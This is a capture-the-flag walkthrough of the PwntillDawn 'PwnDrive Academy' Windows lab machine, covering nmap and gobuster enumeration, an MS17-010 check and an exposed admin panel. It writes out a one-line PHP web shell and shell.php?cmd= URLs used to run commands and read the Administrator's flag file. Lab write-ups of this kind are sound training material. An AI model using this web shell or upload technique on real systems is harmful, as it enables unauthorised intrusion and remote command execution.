pwndrive-academy-writeup
Documented a full Windows web exploitation walkthrough on GitHub involving: • Enumeration • MS17-010 analysis • Admin panel exposure • File upload exploitation • Remote command execution

PwnDrive Academy — PwntillDawn Walkthrough
Hack Enumerate Harder!. Eat. Sleep. Repeat.

Target Information

IP Address: 10.150.150.11
Difficulty: Easy
Operating System: Windows Server 2008 R2

Introduction

Hi guys,

In this walkthrough, I’ll be showing how I compromised the PwntillDawn easy Windows machine PwnDrive Academy through web application exploitation and remote command execution.

Let’s begin the hacks 😈

Nmap Scan
nmap -sC -sV -T4 10.150.150.11
Scan Result

Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-13 11:42 +0000
Nmap scan report for 10.150.150.11
Host is up (0.20s latency).
Not shown: 986 closed tcp ports (reset)

PORT      STATE SERVICE      VERSION
80/tcp    open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.9)
|_http-title: PwnDrive - Your Personal Online Storage
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.9
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.9)
445/tcp   open  microsoft-ds Windows Server 2008 R2 Enterprise 7601 Service Pack 1 microsoft-ds
1433/tcp  open  ms-sql-s     Microsoft SQL Server 2012 11.00.2100.00; RTM
3306/tcp  open  mysql        MariaDB 5.5.5-10.4.14
3389/tcp  open  tcpwrapped
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC

Service Info: OSs: Windows, Windows Server 2008 R2 - 2012

From the scan result, it shows that the target machine is running on a Windows operating system.
Interesting services discovered:

* SMB (445)
* MSSQL (1433)
* MySQL (3306)
* HTTP/HTTPS (80/443)
* RDP (3389)

SMB Enumeration

I started by checking whether the target was vulnerable to MS17-010 (EternalBlue).

nmap -Pn -p445 --script smb-vuln-ms17-010 10.150.150.11
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-13 10:04 +0000
Nmap scan report for 10.150.150.11
Host is up (0.48s latency).

PORT
445/tcp open microsoft-ds
Host script results:
smb-vuln-ms17-010:
VULNERABLE :
Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
State: VULNERABLE
IDs: CVE:CVE-2017-0143
Risk factor: HIGH
A critical remote code execution vulnerability exists in Microsoft SMBv1
servers (ms17-010).

Disclosure date: 2017-03-14
References :
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wa
nnacrypt-attacks/

Nmap done: 1 IP address (1 host up) scanned in 3.37 seconds

nmap -Pn -p445 -- script smb-vuln-ms17-010 10.150.150.11

STATE SERVICE
The target was confirmed vulnerable to EternalBlue.
I attempted exploitation with Metasploit Framework, but the machine became unstable during the exploitation attempts.<img 

Instead of continuing with an unstable attack path, I pivoted to the web application.

Web Enumeration
I used Gobuster to enumerate hidden directories.
gobuster dir -u http://10.150.150.11 -w /usr/share/wordlists/dirb/common.txt -t 50

Interesting Directories Found
/admin
/upload
/utils
/components

Discovering the Admin Panel

Navigating to:
http://10.150.150.11/admin/
<img width="816" height="464" alt="Screenshot 2026-05-13 115411" src="https://github.com/user-attachments/assets/f8e6011f-75dc-4d26-b44f-10375ba613a3" />

revealed an exposed directory listing.

The admin directory exposed:
* manageusers.php
* addedituser.php
* deleteuser.php
* 
<img width="949" height="359" alt="Screenshot 2026-05-15 112742" src="https://github.com/user-attachments/assets/e090f16b-61c9-415e-bbeb-6487695984bc" />
<img width="1366" height="679" alt="117152293-e2ab4f00-ad87-11eb-96e4-ed542e397236" src="https://github.com/user-attachments/assets/8364a258-3474-4d0e-b290-252fd80e559d" />
<img width="1366" height="676" alt="117152625-3322ac80-ad88-11eb-92dd-7aed49967895" src="https://github.com/user-attachments/assets/4189e498-0795-48a2-bbdd-ba0894792c06" />
<img width="946" height="361" alt="Screenshot 2026-05-15 112711" src="https://github.com/user-attachments/assets/8992289c-560d-489c-9125-081a95d504ff" />

This confirmed poor access control and exposed administrative functionality.

Accessing the Admin Dashboard
After accessing the panel, I discovered a file management system with upload functionality.
<img width="946" height="361" alt="Screenshot 2026-05-15 112711" src="https://github.com/user-attachments/assets/92c4d5c6-4c08-4366-90a9-874d2cd193bc" />
Since the backend server was running PHP, I decided to upload a PHP web shell.

Creating the Web Shell
<?php system($_GET['cmd']); ?>
Saved as:
shell.php
Uploading the Shell

The upload was successful.
<img width="1366" height="679" alt="117152293-e2ab4f00-ad87-11eb-96e4-ed542e397236" src="https://github.com/user-attachments/assets/0aba9167-c04f-4768-9c1e-a86915321aa6" /><img width="1366" height="676" alt="117152625-3322ac80-ad88-11eb-92dd-7aed49967895" src="https://github.com/user-attachments/assets/b9ddeb26-d1e9-4a0f-b9b7-659fb1bed73b" />

After uploading the shell, I accessed it directly through the browser.
http://10.150.150.11/upload/2/shell.php?cmd=whoami
<img width="805" height="361" alt="Screenshot 2026-05-15 112624" src="https://github.com/user-attachments/assets/62d5990e-7e27-4016-ab46-74b97cd3167e" />
<img width="611" height="290" alt="Screenshot 2026-05-15 112541" src="https://github.com/user-attachments/assets/cee84a3b-62da-4b99-b510-4b573c2bb778" />

This confirmed remote command execution on the target.

Enumerating the System
Using the web shell, I enumerated the Windows filesystem.
http://10.150.150.11/upload/2/shell.php?cmd=dir+C:\Users
<img width="942" height="230" alt="Screenshot 2026-05-15 120607" src="https://github.com/user-attachments/assets/de5853a2-c2da-437a-8d61-fab0f66c6560" />

The enumeration revealed several user directories, including:
* Administrator
* Public
* MSSQL$SQLEXPRESS

Finding the Flag

I checked the Administrator desktop directory.

http://10.150.150.11/upload/2/shell.php?cmd=dir+C:\Users\Administrator\Desktop
<img width="743" height="175" alt="Screenshot 2026-05-15 120703" src="https://github.com/user-attachments/assets/3f416346-5579-4b69-a8d6-5bd5ece13cf9" />

The output revealed:

<img width="1066" height="562" alt="Screenshot 2026-05-15 121259" src="https://github.com/user-attachments/assets/ab8d7a09-5fb0-4045-9cf0-40379a774379" />

 Retrieving FLAG1
I used the following command to read the flag:
http://10.150.150.11/upload/2/shell.php?cmd=type+C:\Users\Administrator\Desktop\FLAG1.txt

Conclusion

This machine was an excellent example of how insecure web application functionality can lead directly to full system compromise.

Key takeaways from this assessment:

* Proper enumeration is critical
* Exposed admin panels are dangerous
* File upload vulnerabilities can lead to remote command execution
* Web application exploitation can sometimes be more reliable than kernel exploitation

# Tools Used

* Nmap
* Gobuster
* Metasploit Framework
* Burp Suite
* Nikto
* PHP Web Shell

Till another day 😈
